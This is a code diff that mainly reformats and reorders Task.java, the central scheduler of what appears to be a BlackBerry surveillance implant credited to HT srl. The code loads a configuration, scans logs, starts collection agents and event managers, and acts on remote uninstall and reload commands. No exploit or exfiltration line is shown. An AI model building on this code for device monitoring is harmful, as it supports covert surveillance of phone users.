@@ -1,8 +1,8 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib 
- * File         : Task.java 
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : Task.java
  * Created      : 26-mar-2010
  * *************************************************/
 
@@ -12,7 +12,6 @@ import java.util.Timer;
 import java.util.Vector;
 
 import net.rim.device.api.system.DeviceInfo;
-
 import blackberry.action.Action;
 import blackberry.action.SubAction;
 import blackberry.interfaces.Singleton;
@@ -25,214 +24,224 @@ import blackberry.utils.Utils;
 /**
  * The Class Task.
  */
-public class Task implements Singleton {
+public final class Task implements Singleton {
 
-	private static final int SLEEPING_TIME = 1000;
-	private static final long APP_TIMER_PERIOD = 2000;
+    private static final int SLEEPING_TIME = 1000;
+    private static final long APP_TIMER_PERIOD = 2000;
 
-	/** The debug instance. */
-	// #debug
-	private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);
+    /** The debug instance. */
+    // #debug
+    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);
 
-	/** The conf. */
-	Conf conf;
+    /**
+     * Gets the single instance of Task.
+     * 
+     * @return single instance of Task
+     */
+    public static synchronized Task getInstance() {
+        if (instance == null) {
+            instance = new Task();
+        }
+        return instance;
+    }
 
-	/** The status. */
-	Status status;
+    /** The conf. */
+    Conf conf;
 
-	/** The device. */
-	Device device;
+    /** The status. */
+    Status status;
 
-	/** The log collector. */
-	LogCollector logCollector;
+    /** The device. */
+    Device device;
 
-	/** The event manager. */
-	EventManager eventManager;
+    /** The log collector. */
+    LogCollector logCollector;
 
-	/** The agent manager. */
-	AgentManager agentManager;
+    /** The event manager. */
+    EventManager eventManager;
 
-	Timer applicationTimer;
-	AppUpdateManager appUpdateManager;
+    /** The agent manager. */
+    AgentManager agentManager;
+    Timer applicationTimer;
 
-	// ApplicationUpdateTask();
+    // ApplicationUpdateTask();
 
-	private static Task instance;
+    AppUpdateManager appUpdateManager;
 
-	/**
-	 * Instantiates a new task.
-	 */
-	private Task() {
-		status = Status.getInstance();
-		device = Device.getInstance();
-		logCollector = LogCollector.getInstance();
+    private static Task instance;
 
-		eventManager = EventManager.getInstance();
-		agentManager = AgentManager.getInstance();
-		
+    /**
+     * Instantiates a new task.
+     */
+    private Task() {
+        status = Status.getInstance();
+        device = Device.getInstance();
+        logCollector = LogCollector.getInstance();
 
-		// #debug debug
-		debug.trace("Task created");
-	}
+        eventManager = EventManager.getInstance();
+        agentManager = AgentManager.getInstance();
 
-	public static synchronized Task getInstance() {
-		if (instance == null) {
-			instance = new Task();
-		}
-		return instance;
-	}
+        // #debug debug
+        debug.trace("Task created");
+    }
 
-	/**
-	 * Check actions.
-	 * 
-	 * @return true, if successful
-	 */
-	public boolean checkActions() {
-		Utils.sleep(1000);
+    /**
+     * Check actions.
+     * 
+     * @return true, if successful
+     */
+    public boolean checkActions() {
+        Utils.sleep(1000);
 
-		for (;;) {
-			// #debug debug
-			// debug.trace("checkActions");
-			final int[] actionIds = this.status.getActionIdTriggered();
+        for (;;) {
+            // #debug debug
+            // debug.trace("checkActions");
+            final int[] actionIds = status.getActionIdTriggered();
 
-			final int asize = actionIds.length;
-			if (asize > 0) {
+            final int asize = actionIds.length;
+            if (asize > 0) {
 
-				for (int k = 0; k < asize; ++k) {
-					final int actionId = actionIds[k];
-					final Action action = status.getAction(actionId);
+                for (int k = 0; k < asize; ++k) {
+                    final int actionId = actionIds[k];
+                    final Action action = status.getAction(actionId);
 
-					if (action.isTriggered() == false) {
-						// #debug
-						debug.warn("Should be triggered");
-						continue;
-					}
+                    if (action.isTriggered() == false) {
+                        // #debug
+                        debug.warn("Should be triggered");
+                        continue;
+                    }
 
-					// #debug debug
-					debug.trace("CheckActions() triggered" + action);
-					action.setTriggered(false, null);
+                    // #debug debug
+                    debug.trace("CheckActions() triggered" + action);
+                    action.setTriggered(false, null);
 
-					final Vector subActions = action.getSubActionsList();
+                    final Vector subActions = action.getSubActionsList();
 
-					final int ssize = subActions.size();
-					for (int j = 0; j < ssize; ++j) {
+                    final int ssize = subActions.size();
+                    for (int j = 0; j < ssize; ++j) {
 
-						final SubAction subAction = (SubAction) subActions
-								.elementAt(j);
-						final boolean ret = subAction.execute(action
-								.getTriggeringEvent());
+                        final SubAction subAction = (SubAction) subActions
+                                .elementAt(j);
+                        final boolean ret = subAction.execute(action
+                                .getTriggeringEvent());
 
-						if (ret == false) {
-							// #debug
-							debug.warn("CheckActions() error executing: "
-									+ subAction);
-							break;
-						}
+                        if (ret == false) {
+                            // #debug
+                            debug.warn("CheckActions() error executing: "
+                                    + subAction);
+                            break;
+                        }
 
-						if (subAction.wantUninstall()) {
-							// #debug
-							debug.warn("CheckActions() uninstalling");
-							agentManager.stopAll();
-							eventManager.stopAll();
-							return false;
-						}
+                        if (subAction.wantUninstall()) {
+                            // #debug
+                            debug.warn("CheckActions() uninstalling");
+                            agentManager.stopAll();
+                            eventManager.stopAll();
+                            return false;
+                        }
 
-						if (subAction.wantReload()) {
-							// #debug
-							debug.warn("CheckActions() reloading");
-							agentManager.stopAll();
-							eventManager.stopAll();
-							return true;
-						}
-					}
-				}
-			}
-			Utils.sleep(SLEEPING_TIME);
-		}
-	}
+                        if (subAction.wantReload()) {
+                            // #debug
+                            debug.warn("CheckActions() reloading");
+                            agentManager.stopAll();
+                            eventManager.stopAll();
+                            return true;
+                        }
+                    }
+                }
+            }
+            Utils.sleep(SLEEPING_TIME);
+        }
+    }
 
-	/**
-	 * Task init.
-	 * 
-	 * @return true, if successful
-	 */
-	public boolean taskInit() {
-		// #debug debug
-		debug.trace("TaskInit");
+    /**
+     * Start application timer.
+     */
+    synchronized void startApplicationTimer() {
+        // #debug debug
+        debug.trace("startApplicationTimer");
 
-		agentManager.stopAll();
-		eventManager.stopAll();
+        if (applicationTimer != null) {
+            applicationTimer.cancel();
+            applicationTimer = null;
+            appUpdateManager = null;
+        }
 
-		if (device != null) {
-			device.refreshData();
-		}
+        applicationTimer = new Timer();
+        appUpdateManager = new AppUpdateManager();
+        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
+                APP_TIMER_PERIOD);
+    }
 
-		conf = new Conf();
+    /**
+     * Stop application timer.
+     */
+    synchronized void stopApplicationTimer() {
+        // #debug debug
+        debug.trace("stopApplicationTimer");
+        if (applicationTimer != null) {
+            applicationTimer.cancel();
+            applicationTimer = null;
+            appUpdateManager = null;
+        }
+    }
 
-		if (conf.load() == false) {
-			// #debug debug
-			debug.trace("TaskInit - Load Conf FAILED");
+    /**
+     * Task init.
+     * 
+     * @return true, if successful
+     */
+    public boolean taskInit() {
+        // #debug debug
+        debug.trace("TaskInit");
 
-			return false;
-		}
+        agentManager.stopAll();
+        eventManager.stopAll();
 
-		Msg.demo("Configuration... OK\n");
+        if (device != null) {
+            device.refreshData();
+        }
 
-		if (logCollector != null) {
-			logCollector.scanLogs();
-		}
+        conf = new Conf();
 
-		// Da qui in poi inizia la concorrenza dei thread
+        if (conf.load() == false) {
+            // #debug debug
+            debug.trace("TaskInit - Load Conf FAILED");
 
-		if (eventManager.startAll() == false) {
-			// #debug debug
-			debug.trace("TaskInit - eventManager FAILED");
-			return false;
-		}
+            return false;
+        }
 
-		// #debug info
-		debug.info("TaskInit - agents started");
+        Msg.demo("Configuration... OK\n");
 
-		if (agentManager.startAll() == false) {
-			// #debug debug
-			debug.trace("TaskInit - agentManager FAILED");
-			return false;
-		}
+        if (logCollector != null) {
+            logCollector.scanLogs();
+        }
 
-		if (!DeviceInfo.isInHolster()) {
-			// #debug debug
-			debug.trace("going to start ApplicationTimer");
-			startApplicationTimer();
-		}
+        // Da qui in poi inizia la concorrenza dei thread
 
-		// #debug info
-		debug.info("TaskInit - agents started");
-		return true;
-	}
+        if (eventManager.startAll() == false) {
+            // #debug debug
+            debug.trace("TaskInit - eventManager FAILED");
+            return false;
+        }
 
-	synchronized void stopApplicationTimer() {
-		// #debug debug
-		debug.trace("stopApplicationTimer");
-		if (applicationTimer != null) {
-			applicationTimer.cancel();
-			applicationTimer = null;
-			appUpdateManager = null;
-		}
-	}
+        // #debug info
+        debug.info("TaskInit - agents started");
 
-	synchronized void startApplicationTimer() {		
-		// #debug debug
-		debug.trace("startApplicationTimer");
-		
-		if (applicationTimer != null) {
-			applicationTimer.cancel();
-			applicationTimer = null;
-			appUpdateManager = null;
-		}
+        if (agentManager.startAll() == false) {
+            // #debug debug
+            debug.trace("TaskInit - agentManager FAILED");
+            return false;
+        }
 
-		applicationTimer = new Timer();
-		appUpdateManager = new AppUpdateManager();
-		applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
-				APP_TIMER_PERIOD);
-	}
+        if (!DeviceInfo.isInHolster()) {
+            // #debug debug
+            debug.trace("going to start ApplicationTimer");
+            startApplicationTimer();
+        }
+
+        // #debug info
+        debug.info("TaskInit - agents started");
+        return true;
+    }
 }
